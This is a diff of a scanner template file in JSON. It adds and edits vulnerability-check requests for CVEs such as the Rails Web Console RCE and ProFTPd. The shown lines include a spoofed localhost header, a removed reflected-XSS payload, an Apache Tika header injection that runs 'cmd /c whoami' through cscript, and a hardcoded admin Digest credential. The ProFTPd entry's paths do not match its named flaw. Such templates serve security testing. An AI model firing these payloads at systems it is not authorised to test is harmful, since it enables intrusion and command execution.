@@ -3678,6 +3678,24 @@
       ]
     },
     {
+      "id": "CVE-2015-3224",
+      "info": {
+        "name": "Ruby on Rails Web Console - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "headers": {
+            "X-Forwarded-For": "::1"
+          },
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/{{randstr}}"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-3306",
       "info": {
         "name": "ProFTPd RCE",
@@ -3685,9 +3703,12 @@
       },
       "requests": [
         {
+          "headers": {
+            "X-Forwarded-For": "::1"
+          },
           "method": "GET",
           "path": [
-            "{{BaseURL}}/wp-content/plugins/navis-documentcloud/js/window.php?wpbase=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+            "{{BaseURL}}/{{randstr}}"
           ]
         }
       ]
@@ -6249,11 +6270,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -15133,8 +15154,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
